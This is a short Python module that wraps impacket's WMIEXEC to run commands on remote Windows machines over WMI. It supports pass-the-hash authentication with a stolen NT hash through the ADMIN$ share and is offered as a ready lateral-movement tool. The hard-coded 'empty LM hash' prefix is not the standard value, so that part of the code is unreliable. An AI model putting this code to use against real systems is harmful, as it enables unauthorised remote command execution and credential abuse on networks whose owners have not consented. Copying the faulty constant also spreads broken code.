from pympacket.attacks.wmiexec import WMIEXEC

def wmiexec(target, username, domain, password='', nthash=None, cmd='', shell_type='cmd'):
    """Execute commands on a remote computer via wmi, requires admin privileges and the execution is performed in the Domain User context, instead of SYSTEM"""

    # If Pass-The-Hash is used, prepend an empty LM hash before the provided NT one for impacket to successfully authenticate
    if nthash is not None:
        nthash = f'aad3c435b514a4eeaad3b935b51304fe:{nthash}'

    # Execute the specified command in the specified shell type using impacket-wmiexec
    wmi_obj = WMIEXEC(command=cmd, username=username, password=password, domain=domain, hashes=nthash, share='ADMIN$', remoteHost=target, shell_type=shell_type)
    wmi_obj.run(addr=target, silentCommand=False)